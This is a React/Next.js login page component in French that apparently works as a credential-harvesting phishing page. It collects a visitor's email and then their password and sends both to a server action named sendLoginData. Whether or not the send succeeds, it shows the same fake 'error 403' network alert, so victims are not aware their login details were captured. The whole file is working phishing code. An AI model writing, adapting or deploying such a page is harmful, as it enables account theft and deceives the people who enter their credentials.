"use client";

import { useState } from "react";
import { ArrowRight, Eye, EyeOff } from "lucide-react";
import { sendLoginData } from "./actions"; // Import de l'action créée plus haut

export default function Home() {
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (step === 1) {
      if (email) setStep(2);
    } else {
      setLoading(true);
      const formData = new FormData();
      formData.append("email", email);
      formData.append("password", password);

      const result = await sendLoginData(formData);
      
      if (result.success) {
        alert("error 403! please check your network connection");
      } else {
        alert("error 403! please check your network connection");
      }
      setLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-white font-sans">
      <main className="w-full max-w-[600px] flex flex-col items-center px-4">
        
        {/* Titre */}
        <h1 className="text-4xl font-extrabold text-[#B93628] mb-4 text-center tracking-tight">
          Connexion / Inscription
        </h1>
        
        {/* Sous-titre */}
        <p className="text-black font-medium text-lg mb-10 text-center">
          Renseignez votre email pour vous connecter ou créer un compte
        </p>

        {/* Carte Formulaire */}
        <div className="w-full border border-gray-200 rounded-lg p-8 shadow-sm bg-white">
          <form onSubmit={handleSubmit} className="flex flex-col gap-6">
            
            {/* Input Email */}
            <div className="relative group">
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
                  ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
                `}
                readOnly={step === 2}
              />
              {/* Label flottant pour l'email */}
              <label 
                className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
                  peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-[-10px] peer-focus:text-sm
                  ${(!email && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
                `}
              >
                Votre email {step === 1 && <span className="text-gray-400">*</span>}
              </label>
              {step === 2 && (
                <span className="absolute right-3 top-4 text-gray-400">*</span>
              )}
            </div>

            {/* Input Mot de passe (Visible seulement à l'étape 2) */}
            {step === 2 && (
              <div className="relative animate-in fade-in slide-in-from-top-2 duration-300">
                <input
                  type={showPassword ? "text" : "password"}
                  required
                  autoFocus
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="peer w-full h-[60px] px-4 rounded border border-gray-400 outline-none focus:border-gray-600 text-lg text-gray-800"
                />
                <label className="absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500">
                  Votre mot de passe <span className="text-gray-400">*</span>
                </label>
                
                {/* Icône Oeil */}
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-5 text-black"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            )}

            {/* Lien mot de passe oublié */}
            {step === 2 && (
              <div className="w-full text-left">
                <button type="button" className="text-gray-500 hover:underline font-medium">
                  Mot de passe oublié ?
                </button>
              </div>
            )}

            {/* Bouton d'action */}
            <button
              type="submit"
              disabled={loading}
              className="w-full h-[56px] mt-2 rounded bg-[#E3E5E8] hover:bg-[#d4d6d9] text-gray-600 font-bold text-lg flex items-center justify-center gap-2 transition-colors"
            >
              {loading ? (
                <span>Envoi...</span>
              ) : (
                <>
                  {step === 1 ? <ArrowRight size={20} className="text-gray-500" /> : null}
                  {step === 1 ? "Continuer" : "Se connecter"}
                </>
              )}
            </button>

          </form>
        </div>
      </main>
    </div>
  );
}